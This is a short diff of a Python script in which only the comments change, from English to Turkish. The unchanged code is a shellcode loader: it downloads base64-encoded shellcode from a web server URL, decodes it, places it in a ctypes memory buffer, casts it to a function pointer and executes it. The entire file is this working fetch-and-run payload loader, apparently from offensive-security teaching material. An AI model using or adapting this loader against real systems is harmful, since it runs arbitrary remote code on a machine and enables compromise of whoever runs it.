@@ -2,19 +2,19 @@ import base64
 import ctypes
 import urllib.request
 
-# retrieve the shellcode from our web server
+# web sunucumuzdan shell kodunu alın
 url = "http://localhost:8000/shellcode.bin"
 response = urllib.request.urlopen(url)
 
-# decode the shellcode from base64 
+# shell kodunun base64 kodunu çöz
 shellcode = base64.b64decode(response.read())
 
-# create a buffer in memory
+# bellekte bir buffer oluştur
 shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
 
-# create a function pointer to our shellcode
+# shell kodumuza bir pointer işlevi oluşturun
 shellcode_func = ctypes.cast(shellcode_buffer,
                              ctypes.CFUNCTYPE(ctypes.c_void_p))
 
-# call our shellcode
+# shell kodunu çağırın
 shellcode_func()
